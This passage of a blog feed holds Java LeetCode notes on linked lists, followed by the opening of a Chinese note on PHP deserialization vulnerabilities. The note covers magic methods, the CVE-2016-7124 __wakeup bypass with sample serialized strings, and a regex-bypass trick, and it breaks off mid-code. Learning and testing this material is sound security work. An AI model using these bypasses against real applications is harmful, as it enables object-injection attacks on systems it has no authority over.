class="line">        toAdd.next = pred.next;</span><br><span class="line">        pred.next = toAdd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size--;</span><br><span class="line">        ListNode pred= head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pred.next = pred.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双链表版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next,prev;</span><br><span class="line">    ListNode()&#123;&#125;</span><br><span class="line">    ListNode(<span class="type">int</span> val)&#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span>&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head,tail;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span>&#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        tail = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//判断哪边时间更短</span></span><br><span class="line">        <span class="keyword">if</span>(index &gt;= size /<span class="number">2</span> )&#123;</span><br><span class="line">            cur = tail;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size - index; i++)&#123;</span><br><span class="line">                cur = cur.prev;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++)&#123;</span><br><span class="line">                cur = cur.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        addAtIndex(<span class="number">0</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">       addAtIndex(size, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size++;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pred</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">toAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        toAdd.next = pred.next;</span><br><span class="line">        pred.next.prev = toAdd;</span><br><span class="line">        toAdd.prev = pred;</span><br><span class="line">        pred.next = toAdd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size--;</span><br><span class="line">        ListNode pred= head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pred.next.next.prev = pred;</span><br><span class="line">        pred.next = pred.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206 反转链表"></a>206 反转链表</h1><p>给你单链表的头节点 head ，请你反转链表，并返回反转后的链表。<br>&#x2F;&#x2F; 双指针</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span>)  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            tmp = cur.next;</span><br><span class="line">            cur.next = prev;</span><br><span class="line">            prev = cur;</span><br><span class="line">            cur = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 递归</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> reverse(<span class="literal">null</span>, head);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverse</span><span class="params">(ListNode prev, ListNode cur)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) <span class="keyword">return</span> prev;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        temp = cur.next;</span><br><span class="line">        cur.next = prev;</span><br><span class="line">        <span class="keyword">return</span> reverse(cur, temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 从后向前递归</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">// 边缘条件判断</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 递归调用，翻转第二个节点开始往后的链表</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">last</span> <span class="operator">=</span> reverseList(head.next);</span><br><span class="line">        <span class="comment">// 翻转头结点与第二个节点的指向</span></span><br><span class="line">        head.next.next = head;</span><br><span class="line">        <span class="comment">// 此时的head节点为尾节点，next需要指向null</span></span><br><span class="line">        head.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 使用虚节点的头插法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyHead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummyHead.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> cur.next;</span><br><span class="line">            <span class="comment">// 头插法</span></span><br><span class="line">            cur.next = dummyHead.next;</span><br><span class="line">            dummyHead.next = cur;</span><br><span class="line">            cur = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyHead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 使用栈解决反转链表问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head.next == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        Stack&lt;ListNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pHead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        cur = pHead;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            cur.next = node;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        cur.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> pHead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题一开始没有让prev指向null出错了</p><h2 id="24-两两交换链表中的节点"><a href="#24-两两交换链表中的节点" class="headerlink" title="24. 两两交换链表中的节点"></a>24. 两两交换链表中的节点</h2><p>给你一个链表，两两交换其中相邻的节点，并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题（即，只能进行节点交换）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dumyhead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dumyhead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dumyhead;</span><br><span class="line">        ListNode temp;</span><br><span class="line">        ListNode firstnode;</span><br><span class="line">        ListNode secondnode;</span><br><span class="line">        <span class="keyword">while</span>(cur.next != <span class="literal">null</span> &amp;&amp; cur.next.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            temp = cur.next.next.next;</span><br><span class="line">            firstnode = cur.next;</span><br><span class="line">            secondnode = cur.next.next;</span><br><span class="line">            cur.next = secondnode;</span><br><span class="line">            secondnode.next = firstnode;</span><br><span class="line">            firstnode.next = temp;</span><br><span class="line">            cur = firstnode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dumyhead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 递归解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> swapPairs(next.next);</span><br><span class="line">        next.next = head;</span><br><span class="line">        head.next = newNode;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】反序列化漏洞分析笔记 - 第一部分 PHP反序列化分析</title>
      <link href="/2024/09/10/WebSecurity/deserialization/"/>
      <url>/2024/09/10/WebSecurity/deserialization/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是序列化和反序列化？"><a href="#什么是序列化和反序列化？" class="headerlink" title="什么是序列化和反序列化？"></a>什么是序列化和反序列化？</h1><p>我个人的理解是：序列化是将对象转换为字节流，反序列化是将字节流转换为对象。为什么会有这些概念呢？还是来源于具体的需求，举个例子来说，比如一个公司要开发一个软件，这个软件需要保存用户的信息，那么这个信息需要持久化存储，那么这个信息怎么存储呢，这些信息可能是个在程序运行时可能是个对象，经过序列化之后，就可以存储到文件中，那么反序列化就是将存储在文件中的对象，恢复成对象，这样就可以解决对象的持久化存储的问题。</p><h2 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h2><p>不管是什么语言的序列化，从概念需求出发，就可以决定出场景：数据存储、网络传输、通过特定协议读取。</p><h2 id="为什么反序列化会出现漏洞？"><a href="#为什么反序列化会出现漏洞？" class="headerlink" title="为什么反序列化会出现漏洞？"></a>为什么反序列化会出现漏洞？</h2><p>从根本原因来看，我个人感觉还是来自输入数据校验不完整，反序列化漏洞的存在应当归咎于开发者（有时候在想一些漏洞成因时，我总是想要确定下应当是谁负责任……），开发者开发应用时应当假设所有用户都是不可信的，对于所有用可能接触到的输入点都需要格外注意。就反序列化来说，一旦输入数据没有经过校验，那么反序列化的对象就可能会被恶意用户定制化，进而执行恶意代码。</p><h2 id="漏洞利用的关键"><a href="#漏洞利用的关键" class="headerlink" title="漏洞利用的关键"></a>漏洞利用的关键</h2><p>黑盒：判断出存在有序列化的数据，序列化的接口，观察恢复元数据，利用原生类构造调用链，验证是否存在<br>白盒：定位关键函数，观察序列化输入是否可控</p><h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p>在PHP中，序列化和反序列化是将对象转换为可以存储或传输的字符串表示形式的过程，以及将这种字符串表示形式恢复为对象的过程。魔术方法（magic methods）是PHP中一些以双下划线开始的方法，它们在某些操作发生时自动被调用，例如对象的创建、销毁、调用不存在的方法等。序列化和反序列化的函数是使用<code>unserialize()</code>和<code>serialize()</code>函数，其实感觉没什么讨论的，重点先讨论下魔术方法。</p><h2 id="PHP中的魔术方法"><a href="#PHP中的魔术方法" class="headerlink" title="PHP中的魔术方法"></a>PHP中的魔术方法</h2><p>以下内容参考自：<a href="https://segmentfault.com/a/1190000007250604">PHP之十六个魔术方法详解</a></p><ul><li>__construct()，类的构造函数</li><li>__destruct()，类的析构函数</li><li>__call()，在对象中调用一个不可访问方法时调用</li><li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li><li>__get()，获得一个类的成员变量时调用</li><li>__set()，设置一个类的成员变量时调用</li><li>__isset()，当对不可访问属性调用isset()或empty()时调用</li><li>__unset()，当对不可访问属性调用unset()时被调用。</li><li>__sleep()，执行serialize()时，先会调用这个函数</li><li>__wakeup()，执行unserialize()时，先会调用这个函数</li><li>__toString()，类被当成字符串时的回应方法</li><li>__invoke()，调用函数的方式调用一个对象时的回应方法</li><li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li><li>__clone()，当对象复制完成时调用</li><li>__autoload()，尝试加载未定义的类</li><li>__debugInfo()，打印所需调试信息</li></ul><p>其中，__toString()用的比较多，它的触发场景可以总结为下面这些：</p><ul><li>echo($obj)&#x2F;print($obj)打印时会触发 </li><li>反序列化对象与字符串连接时 </li><li>反序列化对象参与格式化字符串时 </li><li>反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型） </li><li>反序列化对象参与格式化SQL语句，绑定参数时 </li><li>反序列化对象在经过php字符串处理函数，如strlen()、strops()、strcmp()、addslashes()等 </li><li>在in_array()方法中，第一个参数时反序列化对象，第二个参数的数组中有__toString()返回的字符串的时候__toString()会被调用 </li><li>反序列化的对象作为class_exists()的参数的时候</li></ul><p>从序列化到反序列化这几个函数的执行过程是：<br><code>__construct()</code> -&gt;<code>__sleep()</code> -&gt; <code>__wakeup()</code> -&gt; <code>__toString()</code> -&gt; <code>__destruct()</code></p><img src="/2024/09/10/WebSecurity/deserialization/image.png" class="" title="Alt text"><p>图中显示的是很经典的图，展示了对象序列化后的内容，其中：</p><ul><li>a - array 数组型</li><li>b - boolean 布尔型</li><li>d - double 浮点型</li><li>i - integer 整数型</li><li>o - common object 共同对象</li><li>r - objec reference 对象引用</li><li>s - non-escaped binary string 非转义的二进制字符串</li><li>S - escaped binary string 转义的二进制字符串</li><li>C - custom object 自定义对象</li><li>O - class 对象</li><li>N - null 空</li><li>R - pointer reference 指针引用</li><li>U - unicode string Unicode 编码的字符串</li></ul><p>PHP序列化需注意以下几点：</p><ol><li>只序列化属性：PHP的序列化机制默认只序列化对象的公共（public）和受保护（protected）属性。私有（private）属性不会被序列化，除非在类的 __sleep() 魔术方法中明确指定。</li><li>类定义必须可用：反序列化对象时，必须确保定义该对象的类在当前作用域中可用。如果类定义不存在，反序列化将失败，并且可能产生警告或错误。</li><li>控制属性：攻击者如果能够控制序列化数据中的属性值，可能会尝试利用这些属性来触发类的其他方法或执行不安全的操作。</li></ol><h2 id="PHP反序列化绕过技巧"><a href="#PHP反序列化绕过技巧" class="headerlink" title="PHP反序列化绕过技巧"></a>PHP反序列化绕过技巧</h2><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">源自这里</a></p><h3 id="php7-1-反序列化对类属性不敏感"><a href="#php7-1-反序列化对类属性不敏感" class="headerlink" title="php7.1+反序列化对类属性不敏感"></a>php7.1+反序列化对类属性不敏感</h3><p>在序列化的数据中，如果类的属性是protect，则结果会在变量名前加上<code>\x00*\x00</code>(所以在fuzzing时需要注意用urlencode处理，不然直接输出显示会丢掉这些字符)<br>但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有<code>\x00*\x00</code>，也会正常输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="绕过-wakeup-CVE-2016-7124"><a href="#绕过-wakeup-CVE-2016-7124" class="headerlink" title="绕过__wakeup(CVE-2016-7124)"></a>绕过__wakeup(CVE-2016-7124)</h3><p>版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10<br>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果执行<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>, 输出结果为 666<br>而把对象属性个数的值增大执行 <code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>，则会输出abc</p><h3 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="绕过部分正则"></a>绕过部分正则</h3><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头</p><ul><li>利用加号绕过（注意在url里传参时+要编码为%2B）</li><li>serialize(array(a));为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 